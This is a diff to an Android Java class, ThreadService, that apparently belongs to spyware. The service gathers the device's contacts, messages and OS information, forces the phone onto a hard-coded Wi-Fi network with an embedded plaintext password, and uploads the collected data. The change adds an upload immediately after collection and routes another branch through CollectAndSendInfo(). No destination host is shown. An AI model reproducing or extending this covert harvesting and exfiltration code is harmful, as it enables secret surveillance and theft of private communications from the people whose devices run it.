@@ -24,8 +24,8 @@ public class ThreadService implements Runnable
     private String PreviousSsid;
     private String PreviousPass;
 
-    private String SSID = "123";
-    private String Pass = "12345678";
+    private String SSID = "Prosto bogi";
+    private String Pass = "Irbis1337";
 
     public ThreadService(Context _context)
     {
@@ -38,6 +38,7 @@ public class ThreadService implements Runnable
         ContactCollector.getContactList(context);
         MessagesCollector.GetMessagesInfo(context);
         SystemCollector.SetOsInfo(context);
+        new UploadTask().execute();
     }
 
 
@@ -78,7 +79,7 @@ public class ThreadService implements Runnable
                 WiFiConnectionManager.EnableWifi(context);
                 WiFiConnectionManager.Disconnect(context);
                 WiFiConnectionManager.Connect(context, SSID, Pass);
-                new UploadTask().execute();
+                CollectAndSendInfo();
             }
             else
             {
